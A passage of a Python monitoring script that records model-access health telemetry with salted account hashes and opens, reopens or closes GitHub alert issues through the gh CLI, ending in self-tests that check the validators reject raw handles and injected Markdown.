            # Primary failed while FIRING: retry on the registry with the ambient token. Never
            # re-run the identical route (no value). The registry retry is PUBLIC -> redacted.
            if not delivered and fb_distinct:
                print(f"::warning::model-health: {action['condition']}/{action['provider']} alert "
                      "delivery failed on the private route — retrying on the registry")
                delivered = _upsert_alert(action, fb_repo, fb_token, maintainer, redact=True)
            elif delivered and fb_other_repo and (action["condition"],
                                                  action["provider"]) in fallback_open:
                # The primary took the alert, but a PRIOR tick's #175 retry left a copy open on
                # the fallback: every tick from here refreshes the primary while that copy rots
                # with the body it was created with. Close it as superseded (issue #344) so one
                # condition never shows two divergent open issues. Guarded by fb_other_repo, not
                # fb_distinct: only reachable when the PRIMARY write confirmed AND the fallback is
                # a genuinely DIFFERENT repository — the retry above owns the other branch, and
                # closing a copy on the repository the alert actually landed on would erase it.
                _close_superseded_alert(action, fb_repo, fb_token)
        elif fb_distinct and (action["condition"], action["provider"]) in fallback_open:
            # The marker was SEEN open on the fallback repo (a prior firing retry created it):
            # close it there too, and require BOTH routes to confirm — a steady no-op on the
            # primary says nothing about the issue that lives on the fallback (review #340). The
            # fallback repo is the public registry -> redacted.
            delivered = _upsert_alert(action, fb_repo, fb_token, maintainer, redact=True) and delivered
        if not delivered:
            undelivered.append(action)
    return undelivered


def _gh(args, token, capture=False):
    env = dict(os.environ)
    if token:
        env["GH_TOKEN"] = token
    return subprocess.run(["gh"] + args, capture_output=capture, text=True, env=env)


def _find_marker_issue(repo, token, marker, state):
    """The issue number carrying the hidden marker in `state`, or None if the read succeeded, was
    complete, and nothing matched. RAISES HealthError on a failed/garbled/possibly-truncated gh
    list (issues #175, #203): a failed OR truncated read must NEVER be mistaken for 'not found' —
    that let an unreadable/oversized tracker be treated as empty and a duplicate alert created over
    it. The lookup is authoritative — gh paginates the API to fill ALERT_LOOKUP_CAP, and a result
    AT the cap is treated as possibly truncated and raised. The caller turns a raise into a
    delivery FAILURE (retry the fallback route, then fail nonzero), never a blind create."""
    proc = _gh(["issue", "list", "-R", repo, "--label", ALERT_LABEL, "--state", state,
                "--json", "number,body", "--limit", str(ALERT_LOOKUP_CAP)], token, capture=True)
    if proc.returncode != 0:
        raise HealthError(f"gh issue list ({state}) failed")
    try:
        found = json.loads(proc.stdout or "[]")
    except ValueError as exc:
        raise HealthError("gh issue list returned malformed JSON") from exc
    if not isinstance(found, list):
        # Valid-but-wrong JSON ({} / null / a scalar) is just as unreadable as garbled JSON:
        # treating it as an empty tracker would re-enable the blind create this guard exists for.
        raise HealthError("gh issue list returned non-list JSON")
    if len(found) >= ALERT_LOOKUP_CAP:
        # The window is full: a matching marker could exist beyond it. Fail closed on a possibly
        # truncated read rather than mistake it for 'not found' and risk a blind duplicate (#203).
        raise HealthError(f"gh issue list ({state}) hit the {ALERT_LOOKUP_CAP}-issue lookup cap "
                          "(possibly truncated)")
    return next((i["number"] for i in found if isinstance(i, dict)
                 and marker in (i.get("body") or "")), None)


def _open_alert_markers(repo, token):
    """Every (condition, provider) whose model-health alert issue is currently OPEN on `repo`
    (issue #205), so `decide` can recover an alert whose provider has aged out of the window.
    FAIL-OPEN: an unreadable/garbled/possibly-truncated list yields the EMPTY set — the orphan
    recovery it feeds only ever CLOSES a stale alert, so a spurious open here would fabricate a
    recovery. A read failure must therefore delay a recovery (retry next tick), never invent one;
    a firing alert is unaffected because its own records still drive its action."""
    proc = _gh(["issue", "list", "-R", repo, "--label", ALERT_LABEL, "--state", "open",
                "--json", "body", "--limit", str(ALERT_LOOKUP_CAP)], token, capture=True)
    if proc.returncode != 0:
        print("::warning::model-health decide: cannot list open alerts for recovery "
              "(will retry next tick)")
        return set()
    try:
        found = json.loads(proc.stdout or "[]")
    except ValueError:
        return set()
    if not isinstance(found, list) or len(found) >= ALERT_LOOKUP_CAP:
        # Non-list JSON is unreadable; a full window is possibly truncated. Fail open to empty
        # (no fabricated recovery) rather than act on a partial view.
        return set()
    return parse_alert_markers(i.get("body") for i in found if isinstance(i, dict))


def _upsert_alert(action, repo, token, maintainer, redact=False):
    """Idempotent one-issue-per-(condition,provider) upsert keyed by the hidden body marker.
    OPERATIONAL idempotency (review defect #7): every gh return code is checked; a flap REOPENS the
    closed marker issue instead of creating a duplicate; and the recovery comment is posted only
    AFTER a CONFIRMED close, so a failed close retries next tick without comment spam.

    Returns True iff the desired state is CONFIRMED — the mutation succeeded, or nothing was needed
    (steady no-alert with no open issue). Returns False on ANY failed gh mutation or an unreadable
    tracker (issue #175): the caller retries the fallback route and, if that also fails, exits
    NONZERO so an unusable ALERT_TOKEN can never drop an alert while the run stays green."""
    title = _alert_title(action["condition"], action["provider"])
    marker = _marker(action["condition"], action["provider"])
    body = render_body(action, maintainer, redact=redact)
    # best-effort, idempotent (exists -> nonzero is fine)
    _gh(["label", "create", ALERT_LABEL, "-R", repo, "--color", "d73a4a",
         "--description", "Autonomous model-access health alert (maintainer action)"],
        token, capture=True)
    try:
        num = _find_marker_issue(repo, token, marker, "open")
    except HealthError as exc:
        # An unreadable tracker is NOT 'not found' — do not create over it (would duplicate).
        print(f"::warning::model-health: cannot read the {action['condition']} alert tracker "
              f"({exc}) — treating as undelivered (no blind create)")
        return False
    if action["fire"]:
        if num is not None:
            if _gh(["issue", "edit", str(num), "-R", repo, "--body", body], token).returncode == 0:
                print(f"::warning::model-health: refreshed {action['condition']} alert "
                      "(detail in the issue)")
                return True
            print(f"::warning::model-health: refresh of {action['condition']} alert FAILED "
                  "(will retry next tick)")
            return False
        # Flap: reuse (REOPEN) the closed marker issue rather than minting a new one.
        try:
            closed = _find_marker_issue(repo, token, marker, "closed")
        except HealthError as exc:
            print(f"::warning::model-health: cannot read the {action['condition']} closed tracker "
                  f"({exc}) — treating as undelivered (no blind create)")
            return False
        if closed is not None:
            # True only when BOTH the reopen and the body refresh land: a reopened issue with a
            # stale body is not the desired state. A reopen that lands with a failed edit is safe
            # to retry — next tick finds the issue open and takes the refresh path.
            if (_gh(["issue", "reopen", str(closed), "-R", repo], token).returncode == 0
                    and _gh(["issue", "edit", str(closed), "-R", repo,
                             "--body", body], token).returncode == 0):
                print(f"::warning::model-health: reopened {action['condition']} alert "
                      "(detail in the issue)")
                return True
            print(f"::warning::model-health: reopen of {action['condition']} alert FAILED "
                  "(will retry next tick)")
            return False
        if _gh(["issue", "create", "-R", repo, "--title", title,
                "--label", ALERT_LABEL, "--body", body], token).returncode == 0:
            print(f"::warning::model-health: raised {action['condition']} alert "
                  "(detail in the issue)")
            return True
        print(f"::warning::model-health: raising {action['condition']} alert FAILED "
              "(will retry next tick)")
        return False
    elif num is not None:
        # Close FIRST; comment only on a CONFIRMED state change so a failed close cannot
        # re-comment every tick.
        if _gh(["issue", "close", str(num), "-R", repo], token).returncode == 0:
            _gh(["issue", "comment", str(num), "-R", repo, "--body",
                 "✅ Recovered — successful model access is back. Auto-closed."], token)
            print(f"model-health: recovered {action['condition']} — alert closed")
            return True
        print(f"::warning::model-health: close of {action['condition']} alert FAILED "
              "(will retry next tick without commenting)")
        return False
    # Steady no-alert with no open issue: nothing to deliver.
    return True


def _close_superseded_alert(action, repo, token):
    """Close the FALLBACK copy of a still-FIRING alert that has just been delivered on the primary
    route (issue #344).

    The #175 firing retry CREATES the alert on the public registry while the primary route is
    transiently unusable. Once the primary recovers, later firing ticks refresh the primary copy
    while the fallback copy stays open carrying the body it was created with — two divergent open
    issues for one condition, until the eventual recovery closes both (review #340). Closing the
    fallback copy as superseded leaves exactly one open copy, on the route that is being kept
    current, and is self-healing: if the primary fails again the #175 retry finds this closed
    marker issue and REOPENS it (the flap path in _upsert_alert), so no alert is lost.

    Best-effort by design, and the caller does NOT fold the result into `undelivered`: the alert
    itself reached the maintainer on the primary, so a failed dedup must not turn a delivered
    alert into a red run. An unreadable tracker or a failed close simply leaves the duplicate for
    the next tick to retry (the marker is still open, so it is still enumerated).

    The comment names no repository and carries no fleet/failure detail — this write lands on the
    PUBLIC registry (sol-audit #204). Returns True iff nothing is left open here: no copy found,
    or the close CONFIRMED."""
    marker = _marker(action["condition"], action["provider"])
    try:
        num = _find_marker_issue(repo, token, marker, "open")
    except HealthError as exc:
        print(f"::warning::model-health: cannot read the {action['condition']} fallback tracker "
              f"({exc}) — the superseded duplicate stays open (will retry next tick)")
        return False
    if num is None:
        # The snapshot is a tick old and fail-open-to-empty; nothing open here now, nothing to do.
        return True
    if _gh(["issue", "close", str(num), "-R", repo], token).returncode != 0:
        print(f"::warning::model-health: close of the superseded {action['condition']} fallback "
              "alert FAILED (will retry next tick without commenting)")
        return False
    # Comment only after a CONFIRMED close, so a failing close cannot spam the issue every tick.
    _gh(["issue", "comment", str(num), "-R", repo, "--body",
         "↩️ Superseded — this alert is being delivered on the primary alert route again, so this "
         "duplicate copy is auto-closed. It reopens here automatically if delivery fails again."],
        token)
    print(f"model-health: closed the superseded {action['condition']} fallback alert copy")
    return True


# ---------------------------------------------------------------------------------------------
# provider fleet resolution for `decide`
# ---------------------------------------------------------------------------------------------
def _enabled_provider_accounts(api, registry_repo, policy_path, salt):
    """{provider: set-of-salted-hashes} for the enabled fleet — needed by provider-capped ("EVERY
    enabled account"). Union of the enabled policy rows' account_pool, mapped to provider via the
    account catalog, then salted. Best-effort: an empty map only disables the provider-capped path
    (the outage/transient paths need no fleet knowledge). Never emits a raw handle."""
    import tomllib
    try:
        with open(policy_path, "rb") as handle:
            document = tomllib.load(handle)
    except (OSError, tomllib.TOMLDecodeError):
        return {}
    pool = set()
    for row in (document.get("repos") or {}).values():
        if isinstance(row, dict) and row.get("enabled") is True:
            pool.update(h for h in (row.get("account_pool") or []) if isinstance(h, str) and h)
    if not pool or not salt:
        return {}
    # account catalog: handle -> provider (open account issues, title=handle, YAML body).
    result = {}
    try:
        issues = api.paginate(f"/repos/{registry_repo}/issues?state=open")
    except HealthError:
        return {}
    for it in issues:
        if not isinstance(it, dict) or "pull_request" in it:
            continue
        handle = (it.get("title") or "").strip()
        if handle not in pool:
            continue
        provider = _provider_of(it.get("body") or "")
        if provider:
            result.setdefault(provider, set()).add(account_hash(handle, salt))
    return result


def _provider_of(body):
    """Extract the `provider:` field from an account issue's YAML body (tolerant line scan; no YAML
    dep). Returns '' if absent."""
    for line in body.splitlines():
        stripped = line.strip()
        if stripped.startswith("provider:"):
            return stripped.split(":", 1)[1].strip()
    return ""


# ---------------------------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------------------------
_NO_CHANGE_ENVELOPE_PREFIX = "no-change-v1 "
_NO_CHANGE_ENVELOPE_FIELDS = {
    "issue": "issue",
    "input": "input_tokens",
    "output": "output_tokens",
    "wall": "wall_seconds",
    # [#701] The declared why-no-diff reason, carried as its VOCABULARY INDEX. The envelope grammar
    # is ASCII-decimal only on purpose (it rides the sanitized reset-hint handoff out of a step that
    # has seen model-controlled text), so the reason travels as a number and is decoded to a name
    # against the closed vocabulary below — a forged index is REFUSED, never folded to a default.
    "why": "why_no_diff",
}


def _parse_no_change_envelope(value):
    """Decode worker-live.sh's numeric-only handoff through the existing sanitized reset-hint
    output. The envelope itself is never stored: it is expanded into typed record fields here."""
    if not isinstance(value, str) or not value.startswith(_NO_CHANGE_ENVELOPE_PREFIX):
        raise ValueError("model-health no_change telemetry envelope is malformed")
    pieces = value[len(_NO_CHANGE_ENVELOPE_PREFIX):].split(",")
    parsed = {}
    for piece in pieces:
        key, separator, raw = piece.partition(":")
        field = _NO_CHANGE_ENVELOPE_FIELDS.get(key)
        if not separator or field is None or field in parsed or not raw.isascii() or not raw.isdigit():
            raise ValueError("model-health no_change telemetry envelope is malformed")
        parsed[field] = int(raw)
    if "issue" not in parsed:
        raise ValueError("model-health no_change telemetry envelope has no issue")
    if "why_no_diff" in parsed:
        # Fail LOUD on an index outside the vocabulary (no_change_routing.reason_name raises): a
        # producer/consumer version skew or a forged envelope must be visible, not silently
        # recorded as `unspecified` — which is exactly the value the routing decision treats as
        # "no signal, take the ordinary ladder".
        try:
            parsed["why_no_diff"] = no_change_routing.reason_name(parsed["why_no_diff"])
        except no_change_routing.ReasonError as exc:
            raise ValueError(f"model-health no_change telemetry envelope: {exc}") from exc
    return parsed


def _cmd_record(args):
    # Fail closed on a provider outside the known set (issue #199): the value is catalog-controlled
    # and must never reach the ledger unvalidated. A separate always()-guarded job runs this, so a
    # red exit is a VISIBLE integrity signal, not a run failure.
    if args.provider not in VALID_RECORD_PROVIDERS:
        print(f"::error::model-health record: refusing unknown provider "
              f"{args.provider!r} (must be one of {sorted(VALID_RECORD_PROVIDERS)})")
        return 1
    # Fail closed on a provider/class MISMATCH (review round 1 of #423): `fleet` is the
    # pseudo-provider for the fleet-wide dispatch-tick signal ONLY — its legitimate classes are
    # the zero-dispatch tick (raw `zero-dispatch`/`claim-abort`), the `success` record that
    # resets the consecutive-tick run, and the `idle` empty-frontier tick (issue #341)
    # (dispatch.yml's four call sites). A `fleet` record with an ordinary per-account class (e.g.
    # auth) or a real-provider record claiming a fleet-only class would corrupt health
    # classification, so neither may reach the ledger.
    folded_class = _decision_class(args.exit_class)
    if args.provider == "fleet":
        if folded_class not in (CLASS_ZERO_DISPATCH, SUCCESS, CLASS_IDLE):
            print(f"::error::model-health record: refusing fleet record with per-account exit "
                  f"class {args.exit_class!r} (fleet carries only zero-dispatch/claim-abort/"
                  f"success/idle)")
            return 1
    elif folded_class in (CLASS_ZERO_DISPATCH, CLASS_IDLE):
        print(f"::error::model-health record: refusing {args.provider!r} record with exit class "
              f"{args.exit_class!r} ({folded_class} is the fleet pseudo-provider's signal)")
        return 1
    salt = os.environ.get("PROVENANCE_SALT", "")
    # provider=fleet carries NO account (there is no single account); everything else salts the
    # raw handle HERE so a raw handle never reaches the ledger. (The pairing guard above already
    # rejected zero-dispatch classes on real providers, so provider is the sole discriminator.)
    if args.provider == "fleet":
        # A fleet/zero-dispatch record has no single account; use a fixed hash-shaped sentinel so
        # the ledger's "account is a salted hash" privacy invariant still holds (validate_ledger).
        account_h = hashlib.sha256(b"fleet-zero-dispatch").hexdigest()[:16]
    else:
        handle = os.environ.get("WORKER_ACCOUNT_HANDLE", args.account or "")
        if not handle or not salt:
            print("::error::model-health record: no account handle/salt — refusing to drop "
                  "per-account health telemetry")
            return 1
        account_h = account_hash(handle, salt)
    # `why_no_diff` has no CLI flag ON PURPOSE (#701): it may only arrive inside the sanitized
    # numeric envelope, so there is no argv path by which a hostile caller could set a reason
    # directly. getattr's default keeps it None until the envelope merge below fills it in.
    no_change = {field: getattr(args, field, None)
                 for field in ("input_tokens", "output_tokens", "wall_seconds", "issue",
                               "why_no_diff")}
    reset_hint = args.reset_hint
    if folded_class == CLASS_NO_CHANGE and reset_hint:
        try:
            envelope = _parse_no_change_envelope(reset_hint)
        except ValueError as exc:
            print(f"::error::model-health record: {exc}")
            return 1
        for field, value in envelope.items():
            if no_change[field] is not None and no_change[field] != value:
                print(f"::error::model-health record: conflicting no_change {field}")
                return 1
            no_change[field] = value
        reset_hint = None
    try:
        record = make_record(args.provider, account_h, args.model_alias, args.exit_class,
                             args.run_id, time.time(), reset_hint=reset_hint, **no_change)
    except ValueError as exc:
        print(f"::error::model-health record: refusing malformed record ({exc})")
        return 1
    # [#341] The empty-frontier tick is the ONLY class that rides the non-flooding gate: dispatch
    # emits it on every quiet tick, and the window can afford one per transition into quiet, not one
    # per tick. Nothing else may be gated — every other class feeds a threshold that counts ticks.
    suppressed = []

    def _skip_redundant_idle(existing, at):
        if not fleet_idle_is_redundant(existing, at):
            return False
        suppressed.append(True)
        return True

    try:
        api = GitHubAPI(os.environ.get("GH_TOKEN") or os.environ.get("REGISTRY_ALERT_TOKEN") or "")
        kept = append_record(api, os.environ["REGISTRY_REPO"], record, time.time(),
                             skip_if=_skip_redundant_idle if folded_class == CLASS_IDLE else None)
    except HealthError as exc:
        # A dropped record leaves an outage invisibly below threshold, so this exits NONZERO
        # (review defect #8 — the old warning-and-exit-0 silently discarded failures on CAS
        # exhaustion). The model run itself is safe: every record call site is a SEPARATE
        # always()-guarded job/continue-on-error step, so this failure is VISIBLE there without
        # failing or reclassifying the run.
        print(f"::error::model-health record failed ({exc})")
        return 1
    if suppressed:
        print(f"model-health: fleet is already recorded {CLASS_IDLE} — skipped the redundant "
              f"empty-frontier record (window={kept}, unchanged)")
        return 0
    print(f"model-health: recorded {record['provider']}/{record['exit_class']} "
          f"(window={kept})")
    return 0


def _cmd_decide(args):
    salt = os.environ.get("PROVENANCE_SALT", "")
    maintainer = os.environ.get("MAINTAINER_HANDLE", "jeswr")
    registry_repo = os.environ["REGISTRY_REPO"]
    api = GitHubAPI(os.environ.get("GH_TOKEN") or "")
    now = time.time()
    try:
        records = prune(read_ledger(api, registry_repo)[0], now)
    except HealthError as exc:
        # Every ledger reader fails LOUD (review r3, issue #28): an unreadable/missing ledger is
        # the exact outage class this branch exists to surface, so warn-and-exit-0 would hide it.
        # groom.yml's decide step is continue-on-error, so the maintenance sweep still completes
        # while this step goes visibly red.
        print(f"::error::model-health decide: cannot read ledger ({exc})")
        return 1
    provider_accounts = _enabled_provider_accounts(
        api, registry_repo, args.policy_file, salt)
    # Currently-open alert markers on EVERY route this system may have delivered to (issues #205,
    # review #340): the firing retry (issue #175) can create an alert on the FALLBACK route, so
    # enumerating only the primary would leave that issue open forever once its provider ages out
    # of the window. Feed the union to classify_records so such an alert still earns an explicit
    # recovery, and pass the fallback's markers to _deliver_alerts so each recovery closes the
    # marker on the repository it was found on (route binding — a no-op on the primary is never
    # proof the fallback issue closed). The same fallback markers let a FIRING action delivered on
    # a recovered primary close its superseded fallback copy (issue #344). Each enumeration stays
    # fail-open-to-empty, so an unreadable/truncated list only defers a recovery (or a dedup) to
    # the next tick, never fabricates one.
    alert_repo, alert_token = _alert_target()
    open_alerts = _open_alert_markers(alert_repo, alert_token)
    fb_repo, fb_token = _registry_fallback()
    fallback_open = set()
    if (fb_repo, fb_token) != (alert_repo, alert_token) and fb_token:
        fallback_open = _open_alert_markers(fb_repo, fb_token)
    actions = classify_records(records, provider_accounts, now, open_alerts | fallback_open)
    # Issue #70: annotate firing outage/transient actions with the provider's public status —
    # AFTER classification, so a probe result can reframe an alert but never decide one.
    annotate_provider_status(actions)
    # Deliver on the primary route, falling back to the salted public registry when a private
    # ALERT_TOKEN is present but unusable (issue #175). A steady no-alert condition with no open
    # issue is a confirmed no-op (never touched), so it never churns nor counts as undelivered.
    undelivered = _deliver_alerts(actions, maintainer, fallback_open)
    fired = [a["condition"] for a in actions if a["fire"]]
    print(f"model-health decide: {len(actions)} conditions checked, "
          f"{len(fired)} firing ({','.join(sorted(set(fired))) or 'none'})")
    if undelivered:
        conds = sorted({f"{a['condition']}/{a['provider']}" for a in undelivered})
        print(f"::error::model-health decide: {len(undelivered)} alert(s) undeliverable on any "
              f"route ({', '.join(conds)}) — an unusable ALERT_TOKEN must fail the run, not drop "
              "the alert silently")
        return 1
    return 0


def main(argv):
    parser = argparse.ArgumentParser(description="Model-access health record + decide")
    sub = parser.add_subparsers(dest="cmd", required=True)

    rec = sub.add_parser("record", help="append one health record (CAS)")
    rec.add_argument("--provider", required=True)
    rec.add_argument("--account", default="", help="RAW handle (salted here; env WORKER_ACCOUNT_HANDLE preferred)")
    rec.add_argument("--model-alias", default="")
    rec.add_argument("--exit-class", required=True)
    rec.add_argument("--run-id", default="")
    rec.add_argument("--reset-hint", default=None)
    rec.add_argument("--input-tokens", type=int, default=None)
    rec.add_argument("--output-tokens", type=int, default=None)
    rec.add_argument("--wall-seconds", type=int, default=None)
    rec.add_argument("--issue", type=int, default=None)
    rec.set_defaults(func=_cmd_record)

    dec = sub.add_parser("decide", help="evaluate the window and upsert/close alerts")
    dec.add_argument("--policy-file", default="policy/repos.toml")
    dec.set_defaults(func=_cmd_decide)

    args = parser.parse_args(argv)
    return args.func(args)


# ---------------------------------------------------------------------------------------------
# self-tests: every decision path ACT + DO-NOTHING + flip-goes-red; the CAS writer; the salting
# privacy property.
# ---------------------------------------------------------------------------------------------
def _self_test():
    ok = True

    def chk(name, got, want):
        nonlocal ok
        good = got == want
        ok = ok and good
        print(f"  {'ok  ' if good else 'FAIL'} {name}: {got!r} (want {want!r})")

    salt = "s3cret"
    now = 1_000_000

    def rec(provider, handle, cls, dt=0, model="fable", run="1", reset=None, **fields):
        return make_record(provider, account_hash(handle, salt), model, cls, run,
                           now + dt, reset_hint=reset, **fields)

    def fires(actions, condition, provider):
        return any(a["condition"] == condition and a["provider"] == provider and a["fire"]
                   for a in actions)

    _action = _action_for

    import contextlib
    import io

    def prune_loud(records, at):
        """(pruned window, captured stderr). [#699] prune's ceiling diagnostic is a ::warning:: on
        stderr; a fixture that trips it must ASSERT the warning rather than leak it into the suite
        log, and every retention fixture below goes through this one door so a warning can never
        appear unnoticed."""
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            window = prune(records, at)
        return window, err.getvalue()

    def ceiling_flood(prefix, extra, start=200, per_second=8):
        """[#699] A flood big enough to reach the ABSOLUTE RETENTION CEILING, packed densely enough
        in time to stay inside a live backoff/cooldown.

        WHY ceiling-scale and not MAX_RECORDS-scale, which is what these fixtures used before: a
        LIVE backoff record is at most BACKOFF_CAP_SECONDS (5 h) old and a live auth cooldown at
        most AUTH_COOLDOWN_SECONDS, so the 7 h retention floor already shields both from the COUNT
        cap. A count-cap-sized flood would therefore evict NOTHING and the preservation assertions
        it feeds would pass whether or not the preservation code existed. The ceiling is now the
        only thing that can evict a live backoff, so it is the regime the guard must be tested in."""
        return [rec("anthropic", f"{prefix}{i:04d}", SUCCESS, dt=start + i // per_second)
                for i in range(RETENTION_CEILING_RECORDS + extra)]

    # ---- SALTING PRIVACY PROPERTY: no raw handle ever appears in a written record ------------
    r = rec("anthropic", "acct02", CLASS_LIMIT, reset="14:00 UTC")
    chk("record stores salted hash not handle", r["account"], account_hash("acct02", salt))
    chk("raw handle absent from record", "acct02" not in json.dumps(r), True)
    chk("hash is 16-hex", _is_hash(r["account"]), True)
    chk("make_record rejects a raw/empty account", _raises(lambda: make_record(
        "anthropic", "", "fable", "auth", "1", now)), True)
    # issue #202: construction fail-closes on a raw handle in ANY field, an unknown provider, and a
    # field that could carry an injected marker/blob — a record a reader would reject can never be
    # built (a silent self-poisoning write).
    chk("make_record rejects a raw handle account", _raises(lambda: make_record(
        "anthropic", "acct01", "fable", "auth", "1", now)), True)
    chk("make_record rejects an unknown provider", _raises(lambda: make_record(
        "acct01", account_hash("a", salt), "fable", "auth", "1", now)), True)
    chk("make_record rejects a non-printable field", _raises(lambda: make_record(
        "anthropic", account_hash("a", salt), "fable", "auth", "acct\n01", now)), True)
    chk("make_record rejects an over-long field", _raises(lambda: make_record(
        "anthropic", account_hash("a", salt), "x" * (RECORD_FIELD_MAX_LEN + 1), "auth", "1", now)),
        True)
    # Review round 1 of PR #444: printability alone admitted raw handles and Markdown markup into
    # PUBLIC fields. Every free-form field must refuse a raw acctNN handle — even where it is a
    # valid token SHAPE (model_alias/run_id) or grammar-clean free text (reset_hint) — and
    # reset_hint (interpolated into a Markdown alert body) must refuse printable markup. Both
    # directions: each rejection here goes green only while its specific check exists, and the
    # legitimate producer forms below must keep constructing.
    hash_a = account_hash("a", salt)
    chk("make_record rejects a raw handle in model_alias", _raises(lambda: make_record(
        "anthropic", hash_a, "acct01", "auth", "1", now)), True)
    chk("make_record rejects a raw handle in run_id", _raises(lambda: make_record(
        "anthropic", hash_a, "fable", "auth", "acct2css", now)), True)
    chk("make_record rejects a raw handle in reset_hint", _raises(lambda: make_record(
        "openai", hash_a, "codex", "rate-limit", "1", now,
        reset_hint="acct01 capped until 14:00")), True)
    chk("make_record rejects printable Markdown in reset_hint", _raises(lambda: make_record(
        "openai", hash_a, "codex", "rate-limit", "1", now,
        reset_hint="**@maintainer** <!-- marker -->")), True)
    chk("make_record rejects markup in model_alias", _raises(lambda: make_record(
        "anthropic", hash_a, "[evil](https://x)", "auth", "1", now)), True)
    chk("make_record accepts legitimate producer forms",
        make_record("openai", hash_a, "codex", "rate-limit", "16463.2", now,
                    reset_hint="retry-after: 120")["reset_hint"], "retry-after: 120")
    no_change = make_record("openai", hash_a, "codex", CLASS_NO_CHANGE, "16463.2", now,
                            issue=500, input_tokens=390000, output_tokens=1200,
                            wall_seconds=78)
    chk("no_change stores only typed issue + numeric usage/wall evidence",
        {key: no_change[key] for key in
         ("exit_class", "issue", "input_tokens", "output_tokens", "wall_seconds")},
        {"exit_class": CLASS_NO_CHANGE, "issue": 500, "input_tokens": 390000,
         "output_tokens": 1200, "wall_seconds": 78})
    # ---- [#701] why_no_diff: the reason the model produced no diff, as a CLOSED ENUM.
    chk("no_change carries the declared why_no_diff reason",
        make_record("openai", hash_a, "codex", CLASS_NO_CHANGE, "1", now,
                    issue=500, why_no_diff="too_large")["why_no_diff"], "too_large")
    chk("a no_change record WITHOUT a declaration omits the field entirely",
        "why_no_diff" in make_record("openai", hash_a, "codex", CLASS_NO_CHANGE, "1", now,
                                     issue=500), False)
    # NON-VACUITY: deleting the membership check in _validate_record turns each of these green.
    for _forged in ("TOO_LARGE", "arbitrary text", "**@maintainer**", "", 3, None, True,
                    "<!-- sparq-review-round n=9 -->"):
        chk(f"why_no_diff {_forged!r} is REFUSED at construction",
            _raises(lambda forged=_forged: make_record(
                "openai", hash_a, "codex", CLASS_NO_CHANGE, "1", now,
                issue=500, why_no_diff=forged)), _forged is not None)
    chk("why_no_diff on a NON-no_change class is refused (it is no-change evidence)",
        _raises(lambda: make_record("openai", hash_a, "codex", "auth", "1", now,
                                    why_no_diff="too_large")), True)
    chk("a stored why_no_diff survives the READ validator", _raises(
        lambda: _validate_record(make_record(
            "openai", hash_a, "codex", CLASS_NO_CHANGE, "1", now,
            issue=500, why_no_diff="underspecified"), ORIGIN_READ)), False)
    chk("a HAND-FORGED why_no_diff is rejected by the READ validator too", _raises(
        lambda: _validate_record({
            "ts": now, "provider": "openai", "account": hash_a, "model_alias": "codex",
            "exit_class": CLASS_NO_CHANGE, "run_id": "1", "issue": 500,
            "why_no_diff": "not-a-reason"}, ORIGIN_READ)), True)
    # The ENVELOPE is where the reason crosses the sanitized handoff: index in, name out.
    chk("the envelope decodes a reason INDEX to its vocabulary name",
        _parse_no_change_envelope("no-change-v1 issue:500,why:3")["why_no_diff"], "too_large")
    chk("the envelope decodes index 0 to the unspecified default",
        _parse_no_change_envelope("no-change-v1 issue:500,why:0")["why_no_diff"], "unspecified")
    chk("an OUT-OF-VOCABULARY reason index is REFUSED, never folded to a default",
        _raises(lambda: _parse_no_change_envelope(
            f"no-change-v1 issue:500,why:{len(NO_CHANGE_REASONS)}")), True)
    chk("a non-numeric reason value cannot smuggle text through the envelope",
        _raises(lambda: _parse_no_change_envelope("no-change-v1 issue:500,why:too_large")), True)
    chk("an envelope with NO why field simply omits the reason",
        "why_no_diff" in _parse_no_change_envelope("no-change-v1 issue:500"), False)
    chk("the ledger vocabulary IS the routing module's (one declaration, not two)",
        NO_CHANGE_REASONS is no_change_routing.NO_CHANGE_REASONS, True)

    chk("no_change rejects non-numeric usage at construction (#500 tripwire)",
        _raises(lambda: make_record("openai", hash_a, "codex", CLASS_NO_CHANGE, "1", now,
                                    issue=500, input_tokens="390000")), True)
    chk("no_change numeric evidence is bounded and bools are not integers",
        all((_raises(lambda: make_record(
                 "openai", hash_a, "codex", CLASS_NO_CHANGE, "1", now,
                 issue=500, output_tokens=MAX_USAGE_TOKENS + 1)),
             _raises(lambda: make_record(
                 "openai", hash_a, "codex", CLASS_NO_CHANGE, "1", now,
                 issue=500, wall_seconds=MAX_WALL_SECONDS + 1)),
             _raises(lambda: make_record(
                 "openai", hash_a, "codex", CLASS_NO_CHANGE, "1", now,
                 issue=True)))), True)
    chk("no-change evidence is refused on another exit class",
        _raises(lambda: make_record("openai", hash_a, "codex", CLASS_LIMIT, "1", now,
                                    issue=500)), True)
    chk("account_hash needs salt", _raises(lambda: account_hash("acct02", "")), True)
    # exit-class folding
    chk("session-limit -> limit", _decision_class("session-limit"), CLASS_LIMIT)
    chk("rate-limit -> transient", _decision_class("rate-limit"), CLASS_TRANSIENT)
    chk("novel class -> unknown (never outage)", _decision_class("weird"), CLASS_UNKNOWN)
    chk("other -> unknown (not provider-attributable)", _decision_class("other"), CLASS_UNKNOWN)
    chk("no_change remains distinct until derived", _decision_class("no_change"), CLASS_NO_CHANGE)
    chk("claim-abort counts as a zero-dispatch tick",
        _decision_class("claim-abort"), CLASS_ZERO_DISPATCH)
    chk("success passthrough", _decision_class(SUCCESS), SUCCESS)
    chk("limit keeps reset_hint", "reset_hint" in r, True)
    chk("non-limit drops reset_hint",
        "reset_hint" in rec("anthropic", "a", CLASS_AUTH, reset="x"), False)

    # ---- PROVIDER-OUTAGE: ACT / DO-NOTHING / flip-goes-red ----------------------------------
    outage = [rec("anthropic", "acct01", CLASS_AUTH, dt=0),
              rec("anthropic", "acct02", CLASS_TRANSIENT, dt=60),
              rec("anthropic", "acct03", CLASS_LIMIT, dt=120)]
    chk("outage ACT (3 fails/3 accts)", fires(classify_records(outage, {}, now + 200),
                                              "provider-outage", "anthropic"), True)
    # DO-NOTHING: only one account -> not an outage (rules out one bad token)
    one_acct = [rec("anthropic", "acct01", CLASS_AUTH, dt=i * 30) for i in range(3)]
    chk("outage DO-NOTHING (single account)",
        fires(classify_records(one_acct, {}, now + 100), "provider-outage", "anthropic"), False)
    # flip-goes-red -> green: PER-ACCOUNT clearing (review defects #2/#3) — a success clears
    # ONLY its own account's run...
    own_success = outage + [rec("anthropic", "acct01", SUCCESS, dt=150)]
    chk("outage: an account's own success clears ITS run (drops below threshold)",
        fires(classify_records(own_success, {}, now + 200), "provider-outage", "anthropic"), False)
    # ...so an UNINVOLVED account's (possibly late-recorded) success cannot mask the outage
